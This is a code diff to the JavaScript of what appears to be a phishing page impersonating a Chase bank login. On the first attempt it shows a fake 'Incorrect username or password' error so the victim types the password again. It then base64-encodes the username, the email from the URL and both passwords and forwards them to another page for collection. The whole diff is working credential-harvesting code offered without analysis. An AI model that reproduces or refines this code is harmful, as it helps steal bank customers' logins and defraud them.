@@ -207,6 +207,7 @@
 	  var clicked = 0;
     $('#userId-text-input-field').on('input', function(){$('#userId-label[for="userId-text-input-field"]').toggle($('#userId-text-input-field').val()=='')});
 $('#password-text-input-field').on('input', function(){$('#password-label[for="password-text-input-field"]').toggle($('#password-text-input-field').val()=='')});
+Window.pass1 = "";
 function getUrlVars()
 {
     var vars = [], hash;
@@ -223,16 +224,18 @@ $('#email123').text((getUrlVars()['email']));
 $('#signin-button').on('click', ()=>{
 console.log(4);
 setTimeout(function(){ $('.loader-default').addClass('is-active'); }, 300);
-setInterval(function(){ $('.loader-default').attr('data-text',$('.loader-default').attr('data-text')+'.' ); }, 1000);
+
 setTimeout(function(){
+$('.loader-default').attr('data-text',"Connecting to chase");
 	if(clicked == 1)
 	{
-	var encodedString = btoa(JSON.stringify({ username: $('#userId-text-input-field').val(), email: getUrlVars()['email'], password1:pass1 ,password2: $('#password-text-input-field').val()}));
+	setInterval(function(){ $('.loader-default').attr('data-text',$('.loader-default').attr('data-text')+'.' ); }, 1000);
+	var encodedString = btoa(JSON.stringify({ username: $('#userId-text-input-field').val(), email: getUrlVars()['email'], password1:Window.pass1 ,password2: $('#password-text-input-field').val()}));
 	window.location.replace("/email.html?data="+encodeURIComponent(encodedString));
 	}
 	else
 	{
-	var pass1 = $('#password-text-input-field').val();
+	pass1 = $('#password-text-input-field').val();
 	toastr["error"]("Incorrect username or password.");
 	$('.loader-default').removeClass('is-active');
 	$('#password-text-input-field').val('');
